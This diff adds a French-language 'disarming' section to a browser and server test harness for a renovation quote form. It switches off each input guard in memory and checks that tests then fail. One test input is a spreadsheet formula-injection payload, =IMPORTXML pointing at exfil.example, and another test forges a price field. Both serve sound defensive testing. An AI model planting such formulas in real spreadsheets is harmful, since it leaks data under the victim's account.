@@ -1749,3 +1749,253 @@ titre("26 · LE QUESTIONNAIRE SOUS MOUVEMENT RÉDUIT");
   await ctx.close();
 }
 
+/* ============================================================
+   PARTIE III — LE DÉSARMEMENT
+
+   « UN TEST PEUT VERROUILLER LE DÉFAUT. » Un cas qui passe ne
+   prouve rien tant qu'on n'a pas montré qu'il TOMBE quand la
+   protection disparaît.
+
+   LA MÉTHODE EST LA MÊME POUR LES QUATRE. Un `scenario(desarme)`
+   rend une LISTE DE CONTRÔLES — la même liste dans les deux cas.
+   On la joue armée, elle doit passer entière ; on la rejoue
+   désarmée, et le nombre de contrôles qui tombent doit AUGMENTER.
+   Un garde qu'on retire sans faire tomber un seul contrôle ne
+   gardait rien, et le bilan de fin le dit en toutes lettres.
+
+   LE DÉPÔT N'EST JAMAIS OUVERT EN ÉCRITURE. `js/main.js` est
+   patché dans la RÉPONSE HTTP du banc ; `google/Code.gs` est lu,
+   patché en mémoire, et évalué dans une seconde instance qui
+   partage `etat`. Les empreintes sha256 le prouvent.
+   ============================================================ */
+console.log("");
+console.log("############################################################");
+console.log("PARTIE III · CE QUI TOMBE QUAND ON DÉSARME");
+console.log("############################################################");
+
+const bilanDesarmement = [];
+
+/* Les contrôles qui ne tiennent pas, sur une liste `{quoi, obtenu,
+   attendu}`. Ils ne passent PAS par `dire` : c'est leur COMPTE qui
+   est le verdict, et le compter deux fois fausserait le total. */
+function tombes(liste) {
+  return liste.filter((c) => String(c.obtenu) !== String(c.attendu));
+}
+function rapporter(nom, arme, desarme, quoiDesarme) {
+  const a = tombes(arme), d = tombes(desarme);
+  dire(nom + " · ARMÉ, les " + arme.length + " contrôles passent", a.length, 0,
+    a.map((c) => c.quoi + " : " + JSON.stringify(c.obtenu)
+      + " au lieu de " + JSON.stringify(c.attendu)).join("\n         · "));
+  dire(nom + " · DÉSARMÉ, ils TOMBENT", d.length > a.length, true,
+    "armé : " + a.length + " tombé(s) · désarmé : " + d.length + " tombé(s)"
+    + "\n         un garde qu'on retire sans rien casser ne gardait rien — " + quoiDesarme);
+  d.forEach((c) => note("désarmé, tombe : " + c.quoi + " → " + JSON.stringify(c.obtenu)
+    + " (attendu " + JSON.stringify(c.attendu) + ")"));
+  bilanDesarmement.push({ nom: nom, arme: a.length, desarme: d.length, total: arme.length });
+  return d.length - a.length;
+}
+
+/* ------------------------------------------------------------
+   D1 · `validate()` retiré de l'envoi de l'estimateur
+   ------------------------------------------------------------ */
+titre("D1 · GARDE DU NAVIGATEUR — `validate()` retiré de l'envoi");
+{
+  async function scenario(desarme) {
+    remise();
+    const { ctx, page, posts } = await ouvrir(desarme ? {
+      desarmer: (s) => s.replace(
+        "if (!validate(estimateForm)) return;",
+        "/* DESARME par cet outil */")
+    } : {});
+    await ouvrirEstim(page);
+    await jusquAuxCoordonnees(page);
+    const avant = posts.length;
+    await page.evaluate(() => {
+      document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]').click();
+    });
+    await page.waitForTimeout(1800);
+    const liste = [
+      { quoi: "aucune requête ne part d'un formulaire vide",
+        obtenu: posts.length - avant, attendu: 0 },
+      { quoi: "on reste sur l'écran des coordonnées", obtenu: await ecran(page), attendu: 13 },
+      { quoi: "aucune ligne ne naît au classeur", obtenu: nbLignes(), attendu: 0 }
+    ];
+    await ctx.close();
+    return liste;
+  }
+  const arme = await scenario(false);
+  const desarme = await scenario(true);
+  rapporter("D1 · validate()", arme, desarme,
+    "ici elle épargne au visiteur un aller-retour ; c'est le SERVEUR qui garde la donnée, "
+    + "et le classeur reste vide dans les deux cas");
+}
+
+/* ------------------------------------------------------------
+   D2 · `btn.disabled` retiré de `setLoading()`
+   ------------------------------------------------------------ */
+titre("D2 · GARDE DU NAVIGATEUR — `btn.disabled` retiré de `setLoading()`");
+{
+  async function scenario(desarme) {
+    remise();
+    const { ctx, page, posts } = await ouvrir(desarme ? {
+      desarmer: (s) => s.replace("btn.disabled = on;", "/* DESARME par cet outil */")
+    } : {});
+    await ouvrirEstim(page);
+    await jusquAuxCoordonnees(page);
+    await page.fill("#esName", "ZZTEST Desarme");
+    await page.fill("#esEmail", "zz-desarme@exemple.ca");
+    await page.fill("#esPhone", "418 555 0142");
+    const avant = posts.filter((c) => c.indexOf('"_final":true') !== -1).length;
+    await page.evaluate(() => {
+      const b = document.querySelector('#modal-estimate form[data-form="estimate"] [data-submit]');
+      b.click(); b.click();
+    });
+    await page.waitForTimeout(2200);
+    const liste = [
+      { quoi: "UNE seule requête finale part",
+        obtenu: posts.filter((c) => c.indexOf('"_final":true') !== -1).length - avant, attendu: 1 },
+      { quoi: "UNE seule ligne au classeur", obtenu: nbLignes(), attendu: 1 }
+    ];
+    await ctx.close();
+    return liste;
+  }
+  const arme = await scenario(false);
+  const desarme = await scenario(true);
+  rapporter("D2 · setLoading()", arme, desarme,
+    "le classeur, lui, tient dans les deux cas — c'est `_sid` qui le tient, pas le bouton. "
+    + "Savoir lequel des deux protège quoi est tout l'intérêt de la passe");
+}
+
+/* ------------------------------------------------------------
+   D3 · la purge serveur de `fourchette_vue`
+   ------------------------------------------------------------ */
+const CHEMIN_GS = path.join(RACINE, "google", "Code.gs");
+const SOURCE_GS = fs.readFileSync(CHEMIN_GS, "utf8");
+const EMPREINTE_GS = crypto.createHash("sha256").update(SOURCE_GS).digest("hex");
+{
+  let etatGit = "(inconnu)";
+  try {
+    etatGit = execFileSync("git", ["status", "--porcelain", "--", "google/Code.gs"],
+      { cwd: RACINE, encoding: "utf8" }).trim() || "propre";
+  } catch (e) { etatGit = "(git indisponible)"; }
+  console.log("");
+  console.log("       · état git de `google/Code.gs` : " + etatGit);
+  console.log("       · l'outil ne l'ouvre JAMAIS en écriture : il le LIT, patche la chaîne");
+  console.log("         en mémoire, et l'évalue dans une seconde instance qui partage `etat`.");
+  console.log("         Écrire sur le disque puis restaurer obligerait à refuser de mesurer");
+  console.log("         quand le fichier porte des modifications non validées — c'est-à-dire");
+  console.log("         exactement pendant la session qui corrige un défaut. La passe qui");
+  console.log("         compte le plus se sauterait toute seule, en silence, le jour où elle sert.");
+  console.log("       · empreinte sha256 avant : " + EMPREINTE_GS.slice(0, 16) + "…");
+}
+
+/* Évalue un `Code.gs` patché, sans jamais toucher au disque. */
+function serveurDesarme(ancre, remplacement, quoi) {
+  if (SOURCE_GS.indexOf(ancre) === -1) {
+    arret("l'ancre de " + quoi + " a bougé dans `Code.gs` — le désarmement prouverait "
+      + "exactement l'inverse de ce qu'il annonce. (piège 86)");
+  }
+  const patche = SOURCE_GS.replace(ancre, remplacement);
+  if (patche === SOURCE_GS) arret("le patch de " + quoi + " n'a rien changé.");
+  const noms = Object.keys(services);
+  return new Function(...noms, patche + "\n return { doPost, initialiser };")
+    (...noms.map((x) => services[x]));
+}
+
+titre("D3 · GARDE DU SERVEUR — `delete data.fourchette_vue` désarmé");
+{
+  const CHARGE = () => estimation("desarmeVue", {
+    email: "zz-desarme-vue@exemple.ca", fourchette_vue: "1 $ à 2 $" });
+
+  function releve(instance) {
+    remise();
+    instance.initialiser();
+    const r = JSON.parse(instance.doPost({
+      postData: { contents: JSON.stringify(CHARGE()) } }).getContent());
+    return [
+      { quoi: "l'envoi passe", obtenu: r.success, attendu: true },
+      { quoi: "la colonne porte la fourchette du SERVEUR",
+        obtenu: valeur(2, "Fourchette vue"), attendu: "13 000 $ à 18 000 $" },
+      { quoi: "le montant forgé n'apparaît nulle part dans la ligne",
+        obtenu: feuille().valeurs[1].some((c) => String(c).indexOf("1 $ à 2 $") !== -1),
+        attendu: false }
+    ];
+  }
+  const arme = releve(gs);
+  const desarme = releve(serveurDesarme(
+    "if (data && data.fourchette_vue !== undefined) {",
+    "if (false && data.fourchette_vue !== undefined) {",
+    "la purge de `fourchette_vue`"));
+  rapporter("D3 · purge de `fourchette_vue`", arme, desarme,
+    "sans elle, un montant forgé se grave dans une colonne FIGÉE, et « ce que le "
+    + "visiteur a vu » devient un mensonge qu'on ne peut plus corriger");
+}
+
+titre("D4 · GARDE DU SERVEUR — `texteInerte()` neutralisé");
+{
+  const CHARGE = () => estimation("desarmeInerte", {
+    email: "zz-desarme-inerte@exemple.ca",
+    nom: '=IMPORTXML("https://exfil.example","//a")',
+    prix_raison: "=1+1" });
+
+  function releve(instance) {
+    remise();
+    instance.initialiser();
+    const r = JSON.parse(instance.doPost({
+      postData: { contents: JSON.stringify(CHARGE()) } }).getContent());
+    return [
+      { quoi: "l'envoi passe", obtenu: r.success, attendu: true },
+      { quoi: "AUCUNE cellule n'est un calcul", obtenu: cellulesCalculees(), attendu: 0 },
+      { quoi: "le nom est rangé tel quel",
+        obtenu: valeur(2, "Nom"), attendu: '=IMPORTXML("https://exfil.example","//a")' }
+    ];
+  }
+  const arme = releve(gs);
+  const desarme = releve(serveurDesarme(
+    "return /^[=+\\-@]/.test(v) ? \"'\" + v : v;",
+    "return v; /* DESARME */",
+    "`texteInerte()`"));
+  rapporter("D4 · texteInerte()", arme, desarme,
+    "sans elle, `=IMPORTXML` part sous le compte de l'agence à chaque ouverture du "
+    + "classeur — le format `@` n'y change RIEN, mesuré (piège 93)");
+}
+
+titre("D5 · LE DÉPÔT EST-IL INTACT ?");
+{
+  const apres = crypto.createHash("sha256").update(fs.readFileSync(CHEMIN_GS, "utf8")).digest("hex");
+  dire("`google/Code.gs` porte la MÊME empreinte sha256 qu'au départ", apres, EMPREINTE_GS,
+    "si elle avait changé : git checkout -- google/Code.gs");
+  const mainJs = fs.readFileSync(path.join(RACINE, "js", "main.js"), "utf8");
+  dire("`js/main.js` ne porte aucune marque de désarmement",
+    mainJs.indexOf("DESARME par cet outil"), -1,
+    "les patchs du navigateur vivent dans la RÉPONSE HTTP, jamais sur le disque");
+}
+
+/* ============================================================
+   LE COMPTE
+   ============================================================ */
+await nav.close();
+srvSite.close();
+srvG.close();
+
+console.log("");
+console.log("--- BILAN DU DÉSARMEMENT");
+bilanDesarmement.forEach((b) => {
+  console.log("       · " + b.nom + " — " + b.total + " contrôles · armée : "
+    + b.arme + " tombé(s) · désarmée : " + b.desarme + " tombé(s)"
+    + (b.desarme > b.arme ? "" : "   ← ELLE NE GARDAIT RIEN"));
+});
+
+console.log("");
+console.log("============================================================");
+if (ko) {
+  console.log("L'ESTIMATEUR NE TIENT PAS : " + ko + " échec(s) sur " + n);
+  echecs.forEach((e) => console.log("  · " + e));
+} else {
+  console.log("L'ESTIMATEUR TIENT : " + n + " / " + n);
+}
+console.log("Captures : preuves/estimateur-attaque/");
+console.log("RÉSERVE : Chromium/Playwright, machine de bureau Windows.");
+console.log("          Aucun relevé ne vient d'un appareil réel, y compris ceux en 320 et 390 px.");
+console.log("============================================================");
+process.exit(ko ? 1 : 0);
